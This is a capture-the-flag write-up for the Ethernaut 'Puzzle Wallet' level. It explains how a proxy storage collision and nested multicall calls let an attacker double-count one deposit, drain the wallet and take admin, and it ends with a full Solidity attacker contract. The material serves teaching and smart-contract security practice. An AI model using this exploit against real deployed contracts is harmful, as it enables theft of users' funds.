# Puzzle Wallet Ethernaut

## Goals

=> You'll need to hijack this wallet to become the admin of the proxy.

### Hints

- Understanding how delegatecall works and how msg.sender and msg.value behaves when performing one.

- Knowing about proxy patterns and the way they handle storage variables.

### Solution

- By setting the second storage variable `maxBalance` which is `admin` in the proxy contract to our address by typecasting it like that `uint256(uint160(YOURADDRESS))`, you change the owner of the PuzzleWallet contract to the given address and will win the challenge.

- The only functions giving us the opportunity to change `maxBalance` are `init()` & `setMaxBalance()`, since the `init()` function checks for the `maxBalance` variable, this will not work, so we need to somehow get around the `onlyWhitelisted` modifier and achieve that `address(this).balance == 0`

- To become "whitelisted" we need to change the `owner` variable sitting in Slot 0 which is the `pendingAdmin` variable in the proxy contract, so by calling the `proposeNewAdmin()` function we will be able to send an arbitrary address and this address will be stored in Storage Slot 0 e.g. be the `owner` which then allows us to call the `setMaxBalance()` function, now we need to reduce the balance of the contract to zero, the current balance is 0.001 ETH. The only function that sends ETH from the PuzzleWallet contract is the `execute()` function.

- So to drain the contracts balance we need to deposit some ETH to pass the first require, we also need to increase our balance to 0.002 ETH by sending only 0.001 ETH, we can achieve that due to the misuse of the `multicall()` function which will result in us calling the proxy which delegates a call to the implementation contract which then delegates a call to it self, so we need to somehow call deposit twice, there is a local variable inside the `multicall()` function that Protects against that by setting it to false when the `deposit` selector gets picked out of the `bytes[] data`, but by calling `deposit()` and another `multicall()` inside our first `multicall()` we will be able to call it twice with the same sent value and therefore increasing our balance by "double spending" to twice the amount we sent. In theory there is no limit (except gaslimit/block limit) on how often we can do this.

- Now we need to create a `bytes[] data` that will result in calling the `deposit()` function and then the `multicall()` function inside which we will again call the `deposit()` function, after that we can withdraw the contracts balance and then call the `setMaxBalance()` with our address typecasted like `uint256(uint160(YOURADDRESS))`

- Now by deploying the contract below and sending an arbitrary amount of ETH that is >= 0.001 ETH you will claim ownership and transfer all the balance to your account

### Attacker Contract

```solidity
// Helper interface to make all functions callable easier
interface Target {
    function admin() external view returns (address);

    function proposeNewAdmin(address _newAdmin) external;

    function setMaxBalance(uint256 _maxBalance) external;

    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function multicall(bytes[] calldata data) external payable;
}

contract Attacker {
    constructor(Target target) payable {
        // writes to storage slot 0 e.g. owner in the PuzzleWallet contract
        target.proposeNewAdmin(address(this));
        // add this contract to whitelist so now we can call functions with onlyWhitelisted modifier
        target.addToWhitelist(address(this));

        // create a bytes array that will result in those calls => deposit -> multicall -> deposit

        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(target.deposit.selector);

        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = depositData[0];
        multicallData[1] = abi.encodeWithSelector(
            target.multicall.selector,
            depositData
        );
        target.multicall{value: 0.001 ether}(multicallData);
        // ETH will get withdrawn to the msg.sender whose balance will get increased above
        target.execute(msg.sender, 0.002 ether, "");
        // typecast address to uint and setMaxBalance to claim ownership of the contract
        target.setMaxBalance(uint256(uint160(msg.sender)));
        require(target.admin() == msg.sender, "Failed hacking contract");
        // transfer funds to attacker
        selfdestruct(payable(msg.sender));
    }
}
```
